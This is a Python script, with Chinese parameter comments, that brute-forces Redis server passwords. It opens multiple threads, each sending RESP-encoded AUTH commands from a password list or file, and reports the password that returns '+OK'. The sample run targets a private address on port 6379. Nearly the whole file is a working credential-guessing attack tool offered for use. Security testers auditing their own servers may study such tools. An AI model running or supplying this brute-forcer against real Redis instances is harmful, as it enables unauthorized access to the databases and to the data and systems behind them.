from socket import socket, AF_INET,SOCK_STREAM
from threading import Thread

passContent = None
CRLF = "\r\n"
pad = "\n"
waitDict = {}
finish = False
result = None

class _List(list):

    def __init__(self, seq=()):
        super(_List, self).__init__(seq)

    def readline(self):
        try:
            return self.pop(0).encode()
        except IndexError:
            return b''

    def close(self):
        self.clear()


class _Run(Thread):

    def __init__(self,host:str):
        global waitDict
        super(_Run, self).__init__()
        self.setDaemon(True)
        self.host = tuple(int(each) if each.isalnum() else each for each in host.split(":"))
        self.thisName = self.getName()
        waitDict.update({self.thisName:False})

    def run(self):
        global passContent,waitDict,result,finish
        print(f"<<< Start from {self.thisName} >>>")
        while not waitDict[self.thisName]:
            passwd = passContent.readline().decode()
            if passwd.find(pad) > -1 and passwd.rsplit(pad,1)[1] == "":
                passwd = passwd[:-len(pad)]

            if passwd != '':
                s = socket(AF_INET, SOCK_STREAM)
                s.connect(self.host)
                payload = "".join(_redis_format(*line) for line in [
                    ["auth", f'{passwd}'] if passwd else []
                ]).encode()
                s.send(payload)
                if b'+OK' in s.recv(1024):
                    print(f">>> Success from {self.thisName} <<<")
                    result = passwd
                    s.close()
                    break
                s.close()
            else:
                waitDict.update({self.thisName:True})
                return

        finish = True

def _redis_format(*redis_cmd):
    if len(redis_cmd) == 0:
        return ""

    cmd = f"*{len(redis_cmd)}"
    for line in redis_cmd:
        cmd += f"{CRLF}${len(line)}{CRLF}{line}"
    cmd += CRLF
    return cmd

def goBrute(host:str,threadNum:int,passList):

    global passContent

    if isinstance(passList,str):
        try:
            passContent = open(passList,"rb")
        except FileNotFoundError:
            raise Exception("File not found...")
        except OSError:
            raise  Exception("File can't be read...")
    elif isinstance(passList,list):
        passContent = _List(passList)
    else:
        raise  Exception("Error passList...")

    for each in range(threadNum):
        try:
            _Run(host).start()
        except IndexError:
            break

    while not finish:
        try:
            if not bool(sum(not each for each in waitDict.values())):
                break
        except KeyboardInterrupt:
            print("<<< bye!!! >>>")
            passContent.close()
            exit()

    print(f"<<< get result -> {result} >>>") if result is not None else print("<<< failed... >>>")


if __name__ == '__main__':

    """
        @ host = 目标地址
        @ threadNum = 开启的线程数
        @ passList = [filePath/List] 密码字典，可以是文件路径或纯列表

    """

    password = [
        "123",
        "123456",
        "1234567",
        "23333"
    ]
    #password = "./password.txt"


    goBrute(
        host="192.168.111.142:6379",
        threadNum=5,
        passList=password,
    )
